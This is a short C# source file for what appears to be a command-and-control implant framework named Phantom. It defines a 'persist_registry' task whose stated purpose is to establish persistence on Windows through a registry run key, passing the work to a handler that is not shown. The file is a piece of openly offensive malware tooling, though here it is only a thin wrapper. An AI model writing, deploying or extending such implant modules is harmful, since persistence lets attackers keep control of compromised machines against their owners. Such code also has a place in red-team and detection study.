using System;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using Phantom.Management.Persistence;

namespace Tasks
{
    public class persist_registry : ICommand
    {
        public string command { get; } = "persist_registry";
        public string description { get; } = "Establish persistence via Windows registry run key";
        public string help { get; } = "persist_registry";
        public string version { get; } = "1.0.0.0";
        public string id { get; } = "persist_registry";

        public PhantomTaskResponse CreateTasking(PhantomTaskMessage task)
        {
            try
            {
                return PersistenceHandler.CreateRegistryPersistence();
            }
            catch (Exception ex)
            {
                return new PhantomTaskResponse
                {
                    Completed = false,
                    UserOutput = $"Error creating registry persistence: {ex.Message}"
                };
            }
        }
    }
}